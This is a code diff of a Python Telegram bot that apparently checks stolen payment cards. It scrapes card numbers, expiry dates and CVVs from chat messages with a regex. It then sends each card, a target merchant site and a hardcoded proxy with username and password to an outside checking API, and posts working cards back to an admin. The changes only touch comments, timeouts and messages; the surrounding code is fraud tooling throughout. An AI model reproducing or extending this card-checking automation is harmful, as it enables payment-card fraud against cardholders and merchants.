@@ -1,7 +1,6 @@
 import re
 import aiohttp
 import asyncio
-import random
 from telethon import TelegramClient, events
 from telethon.sessions import StringSession
 from telegram import Bot
@@ -20,11 +19,11 @@ ADMIN_ID = 8493360284               # Admin Telegram ID
 
 API_URL = "https://autosh.arpitchk.shop/puto.php"
 SITE = "https://jasonwubeauty.com"
-PROXY = "45.41.172.51:5794:juftilus:atasaxde44jl"  # Only one proxy used
+PROXY = "45.41.172.51:5794:juftilus:atasaxde44jl"  # Single proxy for API
 
 NUM_WORKERS = 5  # concurrent card processors
 
-# Regex to match almost all common CC formats
+# Regex to match almost all CC formats (pipes, slashes, colons, spaces)
 CARD_REGEX = re.compile(
     r"(\d{15,16})\s*[\|/:]?\s*(\d{2})\s*[\|/:]?\s*(\d{2,4})\s*[\|/:]?\s*(\d{3,4})"
 )
@@ -44,9 +43,9 @@ async def process_card(card: str):
     global session
     params = {"site": SITE, "cc": card, "proxy": PROXY}
 
-    for attempt in range(3):  # retry 3 times
+    for attempt in range(3):  # retry up to 3 times
         try:
-            async with session.get(API_URL, params=params, timeout=55) as resp:
+            async with session.get(API_URL, params=params, timeout=15) as resp:
                 data = await resp.json()
                 break
         except Exception as e:
@@ -69,7 +68,7 @@ async def process_card(card: str):
         print(f"[i] Dropping disabled: {card} -> {data.get('Response')}")
 
 async def card_worker(worker_id: int):
-    """Worker to process queued cards"""
+    """Worker to process queued cards concurrently"""
     print(f"[Worker-{worker_id}] Started")
     while True:
         card = await cards_queue.get()
@@ -89,8 +88,9 @@ async def card_listener(event):
 
     for match in matches:
         card_str = "|".join(match)
+        # Put card into queue for workers (processed immediately if workers free)
         await cards_queue.put(card_str)
-        print(f"[+] Card queued: {card_str}")
+        print(f"[+] Card detected and queued: {card_str}")
 
 # ---------------- TELEGRAM COMMANDS ----------------
 async def start(update: "Update", context: ContextTypes.DEFAULT_TYPE):
@@ -101,7 +101,7 @@ async def start(update: "Update", context: ContextTypes.DEFAULT_TYPE):
         print(f"[BOT] Admin {user_id} sent /start")
     else:
         await context.bot.send_message(chat_id=update.effective_chat.id,
-                                       text="The OFFICIAL dropper of Card X CHK\nAccess Denied — bot only for official group")
+                                       text="Access Denied — bot only for admin")
         print(f"[BOT] Unauthorized /start by {user_id}")
 
 async def drop(update: "Update", context: ContextTypes.DEFAULT_TYPE):
@@ -112,7 +112,6 @@ async def drop(update: "Update", context: ContextTypes.DEFAULT_TYPE):
         print("[BOT] Dropping enabled by admin")
     else:
         await context.bot.send_message(chat_id=update.effective_chat.id, text="❌ Access Denied!")
-        print(f"[BOT] Unauthorized /drop by {update.effective_user.id}")
 
 async def stop(update: "Update", context: ContextTypes.DEFAULT_TYPE):
     global dropping_enabled
@@ -122,7 +121,6 @@ async def stop(update: "Update", context: ContextTypes.DEFAULT_TYPE):
         print("[BOT] Dropping stopped by admin")
     else:
         await context.bot.send_message(chat_id=update.effective_chat.id, text="❌ Access Denied!")
-        print(f"[BOT] Unauthorized /stop by {update.effective_user.id}")
 
 # ---------------- MAIN ----------------
 async def main():
